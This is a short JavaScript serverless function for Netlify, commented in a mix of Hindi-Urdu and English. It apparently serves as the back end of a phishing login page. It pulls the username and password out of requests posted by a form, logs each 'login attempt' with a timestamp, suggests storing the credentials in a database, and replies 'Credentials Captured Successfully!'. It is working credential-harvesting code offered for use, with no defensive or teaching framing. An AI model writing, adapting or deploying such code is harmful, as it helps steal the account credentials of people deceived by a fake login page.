// File Path: netlify/functions/capture.js

exports.handler = async (event) => {
    // 1. Data extract karna jo user form se bhejega
    const { body } = event; // 'body' usually contains the raw data as string or JSON depending on headers
    
    try {
        let credentialsData;

        // Check if it's coming as JSON (Standard for fetch requests with Content-Type header)
        if (event.headers && event.headers["content-type"] === "application/json") {
            credentialsData = JSON.parse(body);
        } else {
            // Fallback to plain text if sent differently, but we expect JSON from our HTML script
             return { statusCode: 200, body: "Raw Text Received" }; 
        }

        const username = credentialsData.username || credentialsData.user;
        const password = credentialsData.password || credentialsData.pass; // Match what your HTML sends
        
        console.log(`==================== NEW LOGIN ATTEMPT ====================`);
        console.log(`TIME: ${new Date().toLocaleString()}`);
        console.log(`USERNAME FOUND: ${username} @ Netlify Server`);
        
        // Aap isay database mein bhi save kar sakte hain agar aapke paas connection ho (jaise MongoDB)
        // Example for simple log verification in console only right now.
        
        return { 
            statusCode: 200, 
            body: JSON.stringify({ message: "Credentials Captured Successfully!" }) 
        };

    } catch (error) {
        console.error("Error processing capture:", error);
        return { statusCode: 500, body: "Server Error" };
    }
};
